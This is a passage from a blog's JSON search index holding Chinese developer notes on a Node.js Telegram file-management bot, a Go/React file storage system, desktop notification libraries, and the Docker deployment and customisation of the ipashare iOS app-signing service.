\u0026#34;⚠️ 请先登录 /login \u0026lt;密码\u0026gt;\u0026#34; }); } if (query.data.startsWith(\u0026#34;cat_\u0026#34;)) { const category = query.data.replace(\u0026#34;cat_\u0026#34;, \u0026#34;\u0026#34;); userCategory[userId] = category; bot.sendMessage(chatId, `✅ 已设置分类为：${category}`); } if (query.data.startsWith(\u0026#34;del_\u0026#34;)) { const fileId = query.data.replace(\u0026#34;del_\u0026#34;, \u0026#34;\u0026#34;); const confirmOpts = { reply_markup: { inline_keyboard: [ [ { text: \u0026#34;✅ 确认删除\u0026#34;, callback_data: `confirmdel_${fileId}` }, { text: \u0026#34;❌ 取消\u0026#34;, callback_data: `cancel_${fileId}` }, ], ], }, }; bot.sendMessage(chatId, `⚠️ 确认要删除文件(ID=${fileId})吗？`, confirmOpts); } if (query.data.startsWith(\u0026#34;confirmdel_\u0026#34;)) { const fileId = query.data.replace(\u0026#34;confirmdel_\u0026#34;, \u0026#34;\u0026#34;); db.run(`DELETE FROM files WHERE id = ? AND user_id = ?`, [fileId, userId], function (err) { if (err) return bot.sendMessage(chatId, \u0026#34;❌ 删除失败。\u0026#34;); if (this.changes === 0) return bot.sendMessage(chatId, \u0026#34;⚠️ 没找到该文件或无权限删除。\u0026#34;); bot.sendMessage(chatId, `✅ 文件(ID=${fileId}) 已删除。`); }); } if (query.data.startsWith(\u0026#34;cancel_\u0026#34;)) { const fileId = query.data.replace(\u0026#34;cancel_\u0026#34;, \u0026#34;\u0026#34;); bot.sendMessage(chatId, `❎ 已取消删除文件(ID=${fileId})。`); } if (query.data.startsWith(\u0026#34;page_\u0026#34;)) { const page = parseInt(query.data.replace(\u0026#34;page_\u0026#34;, \u0026#34;\u0026#34;)); if (page \u0026lt; 1) return bot.answerCallbackQuery(query.id, { text: \u0026#34;已经是第一页\u0026#34; }); sendFilePage(chatId, userId, page, query.message.message_id); } if (query.data.startsWith(\u0026#34;download_\u0026#34;)) { const id = query.data.replace(\u0026#34;download_\u0026#34;, \u0026#34;\u0026#34;); db.get( `SELECT file_id, file_name, category FROM files WHERE id = ? AND user_id = ?`, [id, userId], async (err, row) =\u0026gt; { if (!row) return bot.sendMessage(chatId, \u0026#34;❌ 文件不存在或无权限下载。\u0026#34;); try { const filePath = await downloadFile(row.file_id, row.file_name, row.category); bot.sendMessage(chatId, `✅ 文件已下载到服务器本地：${filePath}`); } catch (err) { console.error(err); bot.sendMessage(chatId, `❌ ${err.message}`); } } ); } if (query.data.startsWith(\u0026#34;detail_\u0026#34;)) { const id = query.data.replace(\u0026#34;detail_\u0026#34;, \u0026#34;\u0026#34;); db.get( `SELECT id, file_id, file_name, category, date, user_id FROM files WHERE id = ? AND user_id = ?`, [id, userId], (err, row) =\u0026gt; { if (!row) return bot.sendMessage(chatId, \u0026#34;❌ 文件不存在或无权限查看。\u0026#34;); const text = `📋 文件详情\\n\\n` + `ID: ${row.id}\\n` + `文件名: ${row.file_name}\\n` + `分类: ${row.category}\\n` + `上传时间: ${row.date}\\n` + `用户ID: ${row.user_id}`; bot.sendMessage(chatId, text).then(() =\u0026gt; { // 自动发送文件 if (row.file_name.endsWith(\u0026#34;.jpg\u0026#34;) || row.file_name.endsWith(\u0026#34;.png\u0026#34;)) { bot.sendPhoto(chatId, row.file_id, { caption: row.file_name }); } else if (row.file_name.endsWith(\u0026#34;.mp4\u0026#34;)) { bot.sendVideo(chatId, row.file_id, { caption: row.file_name }); } else { bot.sendDocument(chatId, row.file_id, {}, { filename: row.file_name }); } }); } ); } bot.answerCallbackQuery(query.id); }); Docker # 使用官方 Node.js 镜像 FROM node:20 # 设置工作目录 WORKDIR /app # 复制 package.json 和 package-lock.json COPY package*.json ./ # 安装依赖 RUN npm install --production # 复制项目代码 COPY . . # 暴露端口（根据 app.js 监听的端口） EXPOSE 3000 # 容器启动命令 CMD [\u0026#34;node\u0026#34;, \u0026#34;bot.js\u0026#34;] docker build -t my-node-app . docker run -d \\ --name node-app \\ -p 3000:3000 \\ -v $(pwd):/app \\ --restart unless-stopped \\ my-node-app 原始消息 数据库结构更新 (db.js) 添加了转发消息相关字段： is_forward: 是否为转发消息 forward_from_chat_id: 来源群组ID forward_from_chat_title: 来源群组名称 forward_from_chat_type: 群组类型 forward_from_chat_username: 群组用户名 forward_message_id: 转发消息ID jump_link: 跳转链接\n转发消息处理 (bot.js) 保存群组信息：检测转发消息并保存完整的群组信息 生成跳转链接： 公开群组/频道：https://t.me/{username}/{message_id} 私有群组：https://t.me/c/{chat_id}/{message_id} 显示来源：在文件列表中显示来源群组名称\n按钮布局更新 将原来的按钮布局改为：\nℹ️ 详情 - 查看文件详细信息 ❌ 删除 - 删除文件 ⬇️ 下载 - 下载文件到服务器本地 🔗 跳转 - 跳转到原始消息（仅转发消息显示）\n详情页面增强 显示是否为转发消息 显示来源群组信息 显示群组类型 显示跳转链接\n自动识别并保存转发的群组消息 为每个转发消息生成可点击的跳转链接 在文件列表中显示统一的四个按钮：详情、删除、下载、跳转 区分公开群和私有群，生成正确的链接格式\n// 通用保存函数 function saveFile(msg, fileId, fileName, type) { const userId = msg.from.id; const chatId = msg.chat.id; const category = userCategory[userId] || \u0026#34;未分类\u0026#34;; // 检查是否为转发消息 const isForward = msg.forward_from || msg.forward_from_chat; let forwardInfo = { is_forward: isForward ? 1 : 0, forward_from_chat_id: null, forward_from_chat_title: null, forward_from_chat_type: null, forward_from_chat_username: null, forward_message_id: null, jump_link: null }; if (isForward \u0026amp;\u0026amp; msg.forward_from_chat) { const forwardChat = msg.forward_from_chat; forwardInfo.forward_from_chat_id = forwardChat.id; forwardInfo.forward_from_chat_title = forwardChat.title; forwardInfo.forward_from_chat_type = forwardChat.type; forwardInfo.forward_from_chat_username = forwardChat.username; forwardInfo.forward_message_id = msg.forward_from_message_id; // 生成跳转链接 if (forwardChat.username) { // 公开群组/频道 forwardInfo.jump_link = `https://t.me/${forwardChat.username}/${msg.forward_from_message_id}`; } else { // 私有群组 forwardInfo.jump_link = `https://t.me/c/${Math.abs(forwardChat.id).toString().substring(4)}/${msg.forward_from_message_id}`; } } db.run( `INSERT INTO files (file_id, file_name, category, user_id, date, is_forward, forward_from_chat_id, forward_from_chat_title, forward_from_chat_type, forward_from_chat_username, forward_message_id, jump_link) VALUES (?, ?, ?, ?, datetime(\u0026#39;now\u0026#39;), ?, ?, ?, ?, ?, ?, ?)`, [fileId, fileName, category, userId, forwardInfo.is_forward, forwardInfo.forward_from_chat_id, forwardInfo.forward_from_chat_title, forwardInfo.forward_from_chat_type, forwardInfo.forward_from_chat_username, forwardInfo.forward_message_id, forwardInfo.jump_link], function (err) { if (err) { console.error(err); bot.sendMessage(chatId, \u0026#34;❌ 存储失败。\u0026#34;); } else { let message = `📦 已保存 ${type}\\nID: ${this.lastID}\\n文件名: ${fileName}\\n分类: ${category}`; if (forwardInfo.is_forward \u0026amp;\u0026amp; forwardInfo.forward_from_chat_title) { message += `\\n来源群组: ${forwardInfo.forward_from_chat_title}`; } bot.sendMessage(chatId, message); } } ); } bots https://github.com/AZeC4/TelegramBot\nhttps://github.com/itgoyo/TelegramBot\nhttps://github.com/itgoyo/TelegramGroup\nNext TGBOT LocalWeb Manage\ngo txt config 新建 回复 Q:A 适用于群回复\n分类 列表 对应分类 sql备份 前端后台等\n","permalink":"https://qfsyso.github.io/posts/node-tg-filebot/","summary":"Node.js TG 文件管理机器人，支持分类存储、分页浏览、搜索、下载、删除文件，同时支持图片缩略图预览和服务器本地下载。\n功能 文件分类管理：支持用户自定义分类。\n文件上传自动保存：支持文档、图片、视频，并记录上传用户和分类。\n分页查看文件列表：可分页显示最近上传的文件。\n图片缩略图：在分页列表中显示图片缩略图。\n文件搜索：按文件名关键字搜索文件。\n获取文件：支持发送文件回 Telegram。\n删除文件：支持单个文件删除，带确认机制。\n下载到本地：将文件下载到服务器本地，支持重试和错误提示。\n命令： /start # 欢迎信息和操作提示 /setcategory # 设置文件分类 /myfiles # 查看最近 10 条文件 /myfilelist [页码] # 分页显示文件列表 /search 关键字 # 搜索文件 /getfile id # 获取文件到 Telegram /delete id # 删除文件\n按钮操作： 分类选择：在 /setcategory 后点击按钮设置分类。\n删除文件：点击“删除”按钮，带确认操作。\n下载文件：点击“下载本地”按钮，将文件下载到服务器本地。\n分页：点击上一页/下一页翻页。\n文件存储 默认本地存储目录：./files/分类名/文件名\n支持自动创建分类目录。\n图片会在分页列表显示缩略图。\n错误处理和日志\n文件下载支持 3 次重试，失败会输出控制台日志。\n用户端收到友好提示，不会导致 bot 崩掉。\n依赖 node-telegram-bot-api sqlite3 axios Node.js \u0026gt;= 16 项目目录结构 bot.js # 主程序 db.","title":"Node TG FileBot"},{"content":"Go-React 文件存储管理 📋 项目概述 这是一个完整的文件存储管理系统，采用 Go 后端 + React 前端的现代化架构。系统提供了用户认证、文件管理、共享功能和管理员控制等核心功能。\n🏗 系统架构 ┌─────────────────┐ HTTP API ┌─────────────────┐ │ React 前端 │ ◄──────────── │ Go 后端 │ │ │ │ │ │ - 用户界面 │ │ - RESTful API │ │ - 状态管理 │ │ - 文件处理 │ │ - 路由控制 │ │ - 用户认证 │ └─────────────────┘ └─────────────────┘ │ ▼ ┌─────────────────┐ │ 文件系统 │ │ │ │ - 文件存储 │ │ - 元数据管理 │ │ - 用户数据 │ └─────────────────┘ 🔧 技术栈 后端 (Go) 语言: Go 1.19+ 框架: 标准库 net/http 存储: 文件系统 + JSON 元数据 认证: Session-based 认证 架构: RESTful API 前端 (React) 框架: React 18 路由: React Router v6 状态管理: React Hooks 样式: 原生 CSS3 构建工具: Create React App 📁 核心功能模块 1. 用户认证系统 后端实现:\n// 用户结构体 type User struct { Username string `json:\u0026#34;username\u0026#34;` Password string `json:\u0026#34;password\u0026#34;` IsAdmin bool `json:\u0026#34;isAdmin\u0026#34;` } // 认证中间件 func authMiddleware(next http.HandlerFunc) http.HandlerFunc 前端实现:\n// 登录组件 function Login({ onLogin }) // 注册组件 function Register() // API 调用 api.login(credentials) api.register(userData) 2. 文件管理系统 后端实现:\n// 文件信息结构体 type FileInfo struct { ID string `json:\u0026#34;id\u0026#34;` Name string `json:\u0026#34;name\u0026#34;` Size int64 `json:\u0026#34;size\u0026#34;` LastModified time.Time `json:\u0026#34;lastModified\u0026#34;` IsDir bool `json:\u0026#34;isDir\u0026#34;` Owner string `json:\u0026#34;owner\u0026#34;` SharedWith []string `json:\u0026#34;sharedWith\u0026#34;` ShareLink string `json:\u0026#34;shareLink,omitempty\u0026#34;` } // 核心处理函数 func handleFiles(w http.ResponseWriter, r *http.Request) func handleUpload(w http.ResponseWriter, r *http.Request) func handleDelete(w http.ResponseWriter, r *http.Request) 前端实现:\n// 文件管理主组件 function FileManager({ currentUser, isAdmin, onLogout }) // 文件列表组件 function FileList({ files, onNavigateToDirectory, onDownload, onDelete, onShare }) // API 调用 api.getFiles(params) api.uploadFile(formData) api.deleteFile(fileId) 3. 文件共享系统 后端实现:\nfunc handleShare(w http.ResponseWriter, r *http.Request) func handleShareLink(w http.ResponseWriter, r *http.Request) 前端实现:\n// 共享对话框组件 function ShareDialog({ file, onClose, onShareComplete }) // API 调用 api.shareFile(shareData) 4. 用户管理系统 后端实现:\nfunc handleUsers(w http.ResponseWriter, r *http.Request) func adminMiddleware(next http.HandlerFunc) http.HandlerFunc 前端实现:\n// 用户管理组件（管理员专用） function UserManagement({ currentUser }) // API 调用 api.getUsers() api.createUser(userData) api.deleteUser(username) 🔐 安全特性 1. 认证与授权 Session-based 认证机制 中间件权限验证 管理员权限控制 自动会话过期处理 2. 文件安全 用户隔离的文件存储 路径遍历攻击防护 文件大小限制（50MB） 文件类型验证 3. 前端安全 XSS 防护 CSRF 保护 输入验证和清理 错误信息脱敏 📊 API 接口设计 认证接口 POST /api/login - 用户登录 POST /api/register - 用户注册 POST /api/logout - 用户登出 文件管理接口 GET /api/files - 获取文件列表 POST /api/upload - 上传文件 DELETE /api/delete - 删除文件 GET /api/search - 搜索文件 POST /api/mkdir - 创建目录 POST /api/share - 共享文件 用户管理接口 GET /api/users - 获取用户列表（管理员） POST /api/users - 创建用户（管理员） DELETE /api/users - 删除用户（管理员） 文件访问接口 GET /uploads/* - 文件下载（需认证） GET /share/* - 共享链接访问 🎨 前端架构特点 1. 组件化设计 功能组件拆分 可复用组件库 统一的 Props 接口 组件间通信机制 2. 状态管理 // 全局状态 const [isAuthenticated, setIsAuthenticated] = useState(false); const [currentUser, setCurrentUser] = useState(null); const [isAdmin, setIsAdmin] = useState(false); // 组件状态 const [files, setFiles] = useState([]); const [isLoading, setIsLoading] = useState(false); const [error, setError] = useState(null); 3. 错误处理 // 错误边界组件 class ErrorBoundary extends React.Component // API 错误处理 class ApiError extends Error // 统一错误显示 {error \u0026amp;\u0026amp; \u0026lt;div className=\u0026#34;error-message\u0026#34;\u0026gt;{error}\u0026lt;/div\u0026gt;} 🚀 性能优化 后端优化 分页查询减少数据传输 文件流式传输 并发安全的数据结构 内存缓存机制 前端优化 组件懒加载 useCallback 防止重复渲染 虚拟滚动（大文件列表） 图片懒加载 📱 响应式设计 CSS 媒体查询 /* 桌面端 */ @media (min-width: 1024px) { ... } /* 平板端 */ @media (max-width: 768px) { ... } /* 移动端 */ @media (max-width: 480px) { ... } 自适应布局 Flexbox 和 Grid 布局 流式网格系统 触摸友好的交互 移动端优化的文件操作 🔄 数据流设计 用户操作 → React 组件 → API 调用 → Go 处理器 → 文件系统/JSON 存储 ↑ ↓ 响应更新 ← 状态更新 ← API 响应 ← HTTP 响应 ← 数据处理结果 🛠 开发工具链 后端开发 go run main.go # 开发模式运行 go build -o server # 构建可执行文件 go test ./... # 运行测试 前端开发 npm start # 开发服务器 npm run build # 生产构建 npm test # 运行测试 📈 扩展性设计 后端扩展点 数据库集成（替换 JSON 存储） 对象存储集成（AWS S3, 阿里云 OSS） 微服务拆分 缓存层集成（Redis） 前端扩展点 状态管理库集成（Redux, Zustand） UI 组件库集成（Ant Design, Material-UI） 国际化支持 PWA 功能 🎯 项目亮点 完整的功能闭环: 从用户注册到文件管理的完整流程 现代化技术栈: Go + React 的高性能组合 安全性考虑: 多层次的安全防护机制 用户体验: 响应式设计和友好的交互 代码质量: 清晰的架构和良好的代码组织 可扩展性: 模块化设计便于功能扩展 📋 部署建议 开发环境 # 后端 cd /path/to/project go run main.go # 前端 cd react-frontend npm start 生产环境 # 构建前端 cd react-frontend npm run build # 构建后端 go build -o fileserver main.go # 运行服务 ./fileserver ","permalink":"https://qfsyso.github.io/posts/go-file-manager/","summary":"Go-React 文件存储管理 📋 项目概述 这是一个完整的文件存储管理系统，采用 Go 后端 + React 前端的现代化架构。系统提供了用户认证、文件管理、共享功能和管理员控制等核心功能。\n🏗 系统架构 ┌─────────────────┐ HTTP API ┌─────────────────┐ │ React 前端 │ ◄──────────── │ Go 后端 │ │ │ │ │ │ - 用户界面 │ │ - RESTful API │ │ - 状态管理 │ │ - 文件处理 │ │ - 路由控制 │ │ - 用户认证 │ └─────────────────┘ └─────────────────┘ │ ▼ ┌─────────────────┐ │ 文件系统 │ │ │ │ - 文件存储 │ │ - 元数据管理 │ │ - 用户数据 │ └─────────────────┘ 🔧 技术栈 后端 (Go) 语言: Go 1.","title":"Go File Manager"},{"content":"Python 系统通知\nfrom plyer import notification notification.notify( title=\u0026#34;提醒\u0026#34;, message=\u0026#34;这是一个跨平台通知\u0026#34;, app_name=\u0026#34;我的程序\u0026#34;, timeout=5 # 秒 ) pip install plyer Node npm install node-notifier const notifier = require(\u0026#39;node-notifier\u0026#39;); // 发送一个通知 notifier.notify({ title: \u0026#39;提醒\u0026#39;, message: \u0026#39;任务已完成！\u0026#39;, sound: true, // 有些平台支持声音 wait: false // 是否等待用户操作 }); const notifier = require(\u0026#39;node-notifier\u0026#39;); const path = require(\u0026#39;path\u0026#39;); notifier.notify( { title: \u0026#39;My awesome title\u0026#39;, message: \u0026#39;Hello from node, Mr. User!\u0026#39;, icon: path.join(__dirname, \u0026#39;coulson.jpg\u0026#39;), // Absolute path (doesn\u0026#39;t work on balloons) sound: true, // Only Notification Center or Windows Toasters wait: true // Wait with callback, until user action is taken against notification, does not apply to Windows Toasters as they always wait or notify-send as it does not support the wait option }, function (err, response, metadata) { // Response is response from notification // Metadata contains activationType, activationAt, deliveredAt } ); notifier.on(\u0026#39;click\u0026#39;, function (notifierObject, options, event) { // Triggers if `wait: true` and user clicks notification }); notifier.on(\u0026#39;timeout\u0026#39;, function (notifierObject, options) { // Triggers if `wait: true` and notification closes }); Next R C ..\n","permalink":"https://qfsyso.github.io/posts/notifier/","summary":"Python 系统通知\nfrom plyer import notification notification.notify( title=\u0026#34;提醒\u0026#34;, message=\u0026#34;这是一个跨平台通知\u0026#34;, app_name=\u0026#34;我的程序\u0026#34;, timeout=5 # 秒 ) pip install plyer Node npm install node-notifier const notifier = require(\u0026#39;node-notifier\u0026#39;); // 发送一个通知 notifier.notify({ title: \u0026#39;提醒\u0026#39;, message: \u0026#39;任务已完成！\u0026#39;, sound: true, // 有些平台支持声音 wait: false // 是否等待用户操作 }); const notifier = require(\u0026#39;node-notifier\u0026#39;); const path = require(\u0026#39;path\u0026#39;); notifier.notify( { title: \u0026#39;My awesome title\u0026#39;, message: \u0026#39;Hello from node, Mr. User!\u0026#39;, icon: path.join(__dirname, \u0026#39;coulson.jpg\u0026#39;), // Absolute path (doesn\u0026#39;t work on balloons) sound: true, // Only Notification Center or Windows Toasters wait: true // Wait with callback, until user action is taken against notification, does not apply to Windows Toasters as they always wait or notify-send as it does not support the wait option }, function (err, response, metadata) { // Response is response from notification // Metadata contains activationType, activationAt, deliveredAt } ); notifier.","title":"Notifier"},{"content":"Debian 服务器上部署 ipashare。\n部署前准备 服务器环境要求\n操作系统：Debian12\n网络：确保服务器能正常访问 Docker 镜像仓库及 Apple App Store Connect API。\n域名建议已绑定并正确解析到该服务器，支持 HTTPS（可通过 Nginx + Certbot 实现）。\n系统依赖工具安装\n执行以下命令安装 Docker 及 Docker Compose：\nsudo apt update sudo apt install -y docker.io docker-compose sudo systemctl enable --now docker 获取 Apple API 凭证\n登录 App Store Connect 创建 API 密钥，包括：\nIssuer ID\nKey ID\n.p8 文件\n这些是项目调用 App Store Connect API 必需项。\n使用 Docker Compose 部署 官方提供 docker-compose.yml 示例，可在服务器上创建并自定义：\nversion: \u0026#39;3\u0026#39; services: server: image: togettoyou/ipashare:latest ports: - \u0026#34;8888:8888\u0026#34; volumes: - ./data:/app/data - ./config:/app/config environment: - SERVER_URL=https://www.xxx.com - SERVER_HTTPPORT=8888 - SERVER_MAXJOB=10 - SERVER_RUNMODE=release - LOG_LEVEL=info - IOS_P12_FILE=/root/testipax/z822.p12 - IOS_P12_PASSWORD=123zxxxxx 将上述内容保存到项目目录下的 docker-compose.yml（注意替换 SERVER_URL 为你自己的域名），然后执行：\n# 后台启动服务 docker-compose up -d # 查看日志 docker-compose logs -f --tail 100 # 停止、启动、重启、清理服务 docker-compose stop docker-compose start docker-compose restart docker-compose down -v 访问与数据结构说明 启动成功后，通过 https://www.xxx.com/admin 可访问后台管理界面。\ndata 目录结构及含义： apple_developer：存放 Apple 开发者 API 凭证。\nupload_file_path：用户上传的 .ipa 文件。\ntemporary_file_path：签名后生成的 IPA，默认存储 1 小时后自动删除。\nsqlite.db：默认使用 SQLite 数据库存储。\n若启用 MySQL，可使用环境变量指定连接和数据存储位置。\n可选优化项与注意事项 启用 HTTPS\n推荐使用 Nginx 反向代理 + Let\u0026rsquo;s Encrypt 获取 TLS 证书。\n将 Nginx 配置为监听 443，转发 /admin 和主服务端口（如 8888）到 ipashare 服务。\n日志持久化和监控\n配置日志驱动，如 json-file 或文件输出，以便长期保存。\n利用 docker logs 或者接入 Prometheus/Grafana 监控容器状态。\n数据备份策略 定期备份 data/apple_developer 和数据库（sqlite.db 或 MySQL）。\n使用 docker-compose down 前，先导出或复制数据目录。\n并发与性能调优\nSERVER_MAXJOB 控制最大签名并发量，建议根据性能瓶颈和服务器规格调整。\n若签名任务多，建议拓展服务器或分布式部署。\n安全与合规\n项目仅用于个人开发者测试分享，禁止用于商业或非法应用，敬请遵守 Apple 政策。\n建议启用防火墙 (ufw/iptables）限制异常访问。\n部署流程总结 1. 安装 Docker 环境 sudo apt update \u0026amp;\u0026amp; sudo apt install -y docker.io docker-compose\n2. 创建项目目录 mkdir ~/ipashare \u0026amp;\u0026amp; cd ~/ipashare\n3. 添加 docker-compose.yml（如上配置内容） 4. 将 Apple API 凭证（.p8 + IDs）放入 data/apple_developer 5. 启动服务 docker-compose up -d\n6. 检查日志确认启动正常 docker-compose logs -f \u0026ndash;tail 50\n7. 访问后台管理界面 浏览器打开： https://www.xxx.com/admin\n总结一览 阶段\t操作内容 准备\t安装 Docker \u0026amp; Compose，获取 Apple API 凭证 配置\t编辑 docker-compose.yml，设置域名、端口、数据卷 启动\tdocker-compose up -d，监控启动日志 使用\t访问 /admin 管理 IPA 分发 优化维护\t配置 HTTPS、日志监控、备份、安全策略等\nerr 403 Team Admins Please check with one of your Team Admins\n使用 APP管理 权限\nerr go p12 Can\u0026rsquo;t Load P12 or PrivateKey File! Please Input The Correct File And Password!\n如果用 P12 签名 - IOS_P12_FILE=/app/data/apple_developer/cert.p12 - IOS_P12_PASSWORD=P12密码 docker-compose down docker-compose up -d 指定本地 data路径 version: \u0026#39;3\u0026#39; services: server: image: togettoyou/ipashare:latest ports: - \u0026#34;8888:8888\u0026#34; volumes: - $PWD/data:/root/togettoyou/data - /etc/timezone:/etc/timezone - /etc/localtime:/etc/localtime environment: - SERVER_URL=https://www.xxx.com - SERVER_HTTPPORT=8888 - SERVER_MAXJOB=10 - SERVER_RUNMODE=release - LOG_LEVEL=info - IOS_P12_FILE=/root/testipax/z822.p12 - IOS_P12_PASSWORD=123123 修改 Bundle ID： Bundle ID： 在server/internal/svc/apple_developer.go文件中，将通配符\u0026quot;*\u0026ldquo;替换为具体Bundle ID。例如：\n// 将这行 bundleIds, err := authorize.GetBundleIdsByIdentifier(\u0026rdquo;*\u0026quot;) // 修改为 bundleIds, err := authorize.GetBundleIdsByIdentifier(\u0026ldquo;com.xxx.xapp\u0026rdquo;)\n// 将这行 bundleIdResponse, err := authorize.CreateBundleIds(\u0026quot;*\u0026quot;) // 修改为 bundleIdResponse, err := authorize.CreateBundleIds(\u0026ldquo;com.xxx.xapp\u0026rdquo;)\nDockerfile\nFROM golang:1.16 AS builder-server COPY server/. /root/togettoyou/ WORKDIR /root/togettoyou/ RUN make FROM node:20-alpine AS builder-web WORKDIR /app COPY web/package*.json ./ RUN yarn install --ignore-engines COPY web/. . RUN yarn run build:prod --ignore-engines FROM togettoyou/zsign:latest AS zsign FROM centos:7 WORKDIR /root/togettoyou/ COPY --from=builder-server /root/togettoyou/ipashare ./ COPY --from=builder-server /root/togettoyou/conf/ ./conf/ COPY --from=builder-web /app/dist/ ./dist/ COPY --from=zsign /zsign/zsign /bin/zsign RUN sed -i \u0026#39;s|mirrorlist=http://mirrorlist.centos.org|#mirrorlist=http://mirrorlist.centos.org|\u0026#39; /etc/yum.repos.d/CentOS-Base.repo \u0026amp;\u0026amp; \\ sed -i \u0026#39;s|#baseurl=http://mirror.centos.org|baseurl=http://mirrors.aliyun.com|\u0026#39; /etc/yum.repos.d/CentOS-Base.repo \u0026amp;\u0026amp; \\ yum clean all \u0026amp;\u0026amp; \\ yum makecache RUN yum install -y openssl openssl-devel unzip zip ENTRYPOINT [\u0026#34;./ipashare\u0026#34;] docker-compose.yml\nversion: \u0026#39;3\u0026#39; services: server: build: context: . dockerfile: Dockerfile ports: - \u0026#34;8888:8888\u0026#34; volumes: - $PWD/data:/root/togettoyou/data - /etc/timezone:/etc/timezone - /etc/localtime:/etc/localtime environment: - SERVER_URL=https://www.4xin.com - SERVER_HTTPPORT=8888 - SERVER_MAXJOB=10 - SERVER_RUNMODE=release - LOG_LEVEL=info - IOS_P12_FILE=/root/testipax/z823.p12 - IOS_P12_PASSWORD=123123 运行\n# 构建并启动服务 docker-compose up --build # 或者在后台运行 docker-compose up --build -d err GLIBC docker logs testipamg-server-1\n./ipashare: /lib64/libc.so.6: version `GLIBC_2.28\u0026rsquo; not found (required by ./ipashare)\n容器中的GLIBC版本太低\nCentOS 7默认使用的是较旧版本的GLIBC（2.17）\nIPA自动识别Bundle ID 原项目在处理IPA签名时，使用的是写死的通配符Bundle ID (*)，这样做虽然简单，但不够精确。我们的目标是让系统能够自动识别上传的IPA文件的真实Bundle ID，并在签名时使用这个具体的Bundle ID。\n核心思路 IPA上传 → 解析Bundle ID → 存储到数据库 → 签名时使用具体Bundle ID → 失败则回退到通配符\n具体修改内容\n1. 修改签名逻辑 (server/internal/svc/apple_device.go) 修改位置: signature 方法中的Bundle ID处理逻辑\n原代码:\nprofileResponse, err := authorize.CreateProfile(profileUUID, appleDeveloper.BundleIds, appleDeveloper.CerID, deviceID) 修改后:\n// 获取IPA的Bundle ID并创建对应的Bundle IDs bundleIdForApp := appleDeveloper.BundleIds // 默认使用通配符 if appleIPA.BundleIdentifier != \u0026#34;\u0026#34; { // 检查是否已存在该Bundle ID existingBundleId, err := authorize.GetBundleIdsByIdentifier(appleIPA.BundleIdentifier) if err == nil \u0026amp;\u0026amp; existingBundleId == \u0026#34;\u0026#34; { // 创建新的Bundle ID bundleIdResponse, err := authorize.CreateBundleIds(appleIPA.BundleIdentifier) if err == nil { bundleIdForApp = bundleIdResponse.Data.ID } } else if existingBundleId != \u0026#34;\u0026#34; { bundleIdForApp = existingBundleId } } profileResponse, err := authorize.CreateProfile(profileUUID, bundleIdForApp, appleDeveloper.CerID, deviceID) 修改说明:\n添加了智能Bundle ID选择逻辑 优先尝试使用IPA的真实Bundle ID 如果Bundle ID不存在，自动创建 如果创建失败，回退到通配符Bundle ID 确保了向后兼容性\n2. 保持开发者账号初始化逻辑 (server/internal/svc/apple_developer.go) 保持不变的部分:\n// 判断账号是否存在bundleIds为*的记录（保持通配符作为默认） bundleIds, err := authorize.GetBundleIdsByIdentifier(\u0026#34;*\u0026#34;) if err != nil { return 0, e.NewWithStack(e.ErrAppstoreAPI, err) } if bundleIds == \u0026#34;\u0026#34; { // 创建新的bundleIds（通配符） bundleIdResponse, err := authorize.CreateBundleIds(\u0026#34;*\u0026#34;) if err != nil { return 0, e.NewWithStack(e.ErrAppstoreAPI, err) } bundleIds = bundleIdResponse.Data.ID } why:\n开发者账号初始化时仍需要通配符Bundle ID作为基础 通配符Bundle ID是备用方案，确保系统稳定性 避免破坏现有的账号管理逻辑\n工作流程图\n┌─────────────┐ │ 上传IPA文件 │ └─────┬───────┘ │ ▼ ┌─────────────┐ │ 解析Bundle ID │ ← 使用现有的 ipa.Parser └─────┬───────┘ │ ▼ ┌─────────────┐ │ 存储到数据库 │ └─────┬───────┘ │ ▼ ┌─────────────┐ │ 设备签名请求 │ └─────┬───────┘ │ ▼ ┌─────────────┐ ┌─────────────┐ │检查具体Bundle│───▶│Bundle ID存在│ │ID是否存在 │ └─────┬───────┘ └─────┬───────┘ │ │不存在 ▼ ▼ ┌─────────────┐ ┌─────────────┐ │使用现有Bundle│ │创建新Bundle │ │ID进行签名 │ │ID │ └─────────────┘ └─────┬───────┘ │成功 ▼ ┌─────────────┐ │使用新Bundle │ │ID进行签名 │ └─────────────┘ │失败 ▼ ┌─────────────┐ │回退到通配符 │ │Bundle ID │ └─────────────┘\n技术细节\nBundle ID的处理逻辑 检查阶段: 使用 authorize.GetBundleIdsByIdentifier() 检查Bundle ID是否存在 创建阶段: 如果不存在，使用 authorize.CreateBundleIds() 创建新的Bundle ID 回退机制: 如果创建失败，使用原有的通配符Bundle ID 错误处理策略\nif err == nil \u0026amp;\u0026amp; existingBundleId == \u0026#34;\u0026#34; { // 只有在没有错误且Bundle ID确实不存在时才创建 bundleIdResponse, err := authorize.CreateBundleIds(appleIPA.BundleIdentifier) if err == nil { // 只有创建成功时才使用新的Bundle ID bundleIdForApp = bundleIdResponse.Data.ID } // 创建失败时自动回退到通配符，不抛出错误 } 总结 docker-compose.yml\nversion: \u0026#39;3\u0026#39; services: server: build: context: . dockerfile: Dockerfile ports: - \u0026#34;8888:8888\u0026#34; volumes: - $PWD/data:/root/togettoyou/data - /etc/timezone:/etc/timezone - /etc/localtime:/etc/localtime environment: - SERVER_URL=https://test123.xxx.com - SERVER_HTTPPORT=8888 - SERVER_MAXJOB=10 - SERVER_RUNMODE=release - LOG_LEVEL=info - IOS_P12_FILE=/root/testipa2/z822.p12 - IOS_P12_PASSWORD=xxx Dockerfile\nFROM golang:1.16 AS builder-server COPY server/. /root/togettoyou/ WORKDIR /root/togettoyou/ RUN make FROM node:20-alpine AS builder-web WORKDIR /app COPY web/package*.json ./ RUN yarn install --ignore-engines COPY web/. . RUN yarn run build:prod --ignore-engines FROM togettoyou/zsign:latest AS zsign FROM centos:7 WORKDIR /root/togettoyou/ COPY --from=builder-server /root/togettoyou/ipashare ./ COPY --from=builder-server /root/togettoyou/conf/ ./conf/ COPY --from=builder-web /app/dist/ ./dist/ COPY --from=zsign /zsign/zsign /bin/zsign RUN sed -i \u0026#39;s|mirrorlist=http://mirrorlist.centos.org|#mirrorlist=http://mirrorlist.centos.org|\u0026#39; /etc/yum.repos.d/CentOS-Base.repo \u0026amp;\u0026amp; \\ sed -i \u0026#39;s|#baseurl=http://mirror.centos.org|baseurl=http://mirrors.aliyun.com|\u0026#39; /etc/yum.repos.d/CentOS-Base.repo \u0026amp;\u0026amp; \\ yum clean all \u0026amp;\u0026amp; \\ yum makecache RUN yum install -y openssl openssl-devel unzip zip ENTRYPOINT [\u0026#34;./ipashare\u0026#34;] # caddy test123.xxx.com { reverse_proxy 0.0.0.0:8888 } # nginx server { listen 80; server_name 